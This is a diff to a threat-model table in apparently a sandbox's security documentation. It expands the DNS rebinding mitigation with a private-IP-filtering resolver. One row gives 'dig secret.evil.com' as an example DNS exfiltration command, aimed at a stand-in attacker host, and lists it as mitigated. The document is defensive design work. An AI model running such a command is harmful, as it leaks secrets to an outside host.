@@ -611,7 +611,7 @@ let safe_output = sanitize_terminal_escapes(&result.stdout);
 | ID | Threat | Attack Vector | Mitigation | Status |
 |----|--------|--------------|------------|--------|
 | TM-NET-001 | DNS spoofing | Resolve to wrong IP | No DNS resolution | **MITIGATED** |
-| TM-NET-002 | DNS rebinding | Rebind after allowlist check | Literal host matching | **MITIGATED** |
+| TM-NET-002 | DNS rebinding | Rebind after allowlist check | Literal host matching + `PrivateIpFilteringResolver` blocks private IPs at connect time | **MITIGATED** |
 | TM-NET-003 | DNS exfiltration | `dig secret.evil.com` | No DNS commands | **MITIGATED** |
 
 **Current Risk**: NONE - Network allowlist uses literal host/IP matching, no DNS
